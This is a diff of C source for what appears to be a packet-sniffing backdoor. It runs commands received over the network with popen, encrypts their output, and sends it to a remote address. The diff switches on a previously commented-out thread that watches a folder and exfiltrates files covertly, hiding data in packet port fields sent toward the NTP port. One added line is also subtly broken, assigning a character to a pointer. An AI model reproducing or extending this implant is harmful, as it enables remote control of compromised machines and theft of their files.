@@ -34,13 +34,13 @@ void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
 {
 	pcap_t* nic;
 	char errbuf[PCAP_ERRBUF_SIZE];
-//	pthread_t exfil_thread;
-//	struct exfil_pack expack;
+	pthread_t exfil_thread;
+	struct exfil_pack expack;
 
 	// Setup Exfil Watch
-//	expack.ipaddr = ipaddr;
-//	expack.folder = folder;
-//	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);
+	expack.ipaddr = ipaddr;
+	expack.folder = folder;
+	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);
 
 	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
 		error(errbuf);
@@ -61,7 +61,7 @@ void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
 		usleep(5000); // sleep 5ms
 	}
 	
-//	pthread_join(exfil_thread, NULL);
+	pthread_join(exfil_thread, NULL);
 }
 
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
@@ -106,6 +106,8 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 	char out[MAX_LEN];
 	int sock = 0;
 	struct sockaddr_in saddr;
+	char buff[MAX_LEN];
+	char * enc = *buff;
 
 	// Run the command, grab stdout
 	fp = popen(command, "r");
@@ -128,10 +130,8 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 	{
 		if (duplex)
 		{
-			char *enc = out;
-
 			int len = strlen(out);
-
+			
 			enc = encrypt(PASSKEY, out, len);
 
 			enc = buildTransmission(enc, &len, RSP_TYP);
@@ -176,6 +176,9 @@ void exfil_send(uint32 ipaddr, char *path)
 			ushort dst_port = 0;
 
 			enc = encrypt(SEKRET, pbuf, 2);
+
+			enc = buildTransmission(enc, &buflen, XFL_TYP);
+
 			src_port = (enc[0] << 8) + enc[1];
 			dst_port = PORT_NTP;
 			free(enc);
